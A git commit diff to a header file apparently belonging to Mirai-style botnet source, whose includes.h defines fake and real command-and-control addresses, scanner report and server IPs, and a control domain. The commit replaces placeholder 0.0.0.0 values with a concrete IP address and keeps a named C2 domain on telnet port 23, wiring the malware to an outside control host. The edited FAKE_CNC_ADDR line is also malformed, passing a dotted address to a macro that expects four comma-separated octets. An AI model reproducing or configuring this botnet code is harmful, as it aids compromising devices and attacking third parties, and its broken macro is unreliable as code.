3f43c3cd78cb3c5153f8c058a0b0503c6fbb6cbf
thomashutze <84834771+thomashutze@users.noreply.github.com>
2023-02-25 18:07:57 +0100

    Update includes.h

--- bot/includes.h
+++ bot/includes.h
@@ -18,19 +18,19 @@ typedef uint16_t port_t;
 
 #define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
 
-#define FAKE_CNC_ADDR INET_ADDR(193,108,200,117)
+#define FAKE_CNC_ADDR INET_ADDR(193.108.200.117)
 #define FAKE_CNC_PORT 23
 /*                                                                 */
 #ifndef USEDOMAIN
-#define SCANIP (int)inet_addr((const char*)"0.0.0.0");
-#define SERVIP (int)inet_addr((const char*)"0.0.0.0");
+#define SCANIP (int)inet_addr((const char*)"193.108.200.117");
+#define SERVIP (int)inet_addr((const char*)"193.108.200.117");
 
 #else
 
 #define SCANDOM "indiatechsupport.club"
 #define SERVDOM "indiatechsupport.club"
-#define SCANIP (int)inet_addr((const char*)"0.0.0.0");
-#define SERVIP (int)inet_addr((const char*)"0.0.0.0");
+#define SCANIP (int)inet_addr((const char*)"193.108.200.117");
+#define SERVIP (int)inet_addr((const char*)"193.108.200.117");
 
 #endif
 /*                                                                 */   
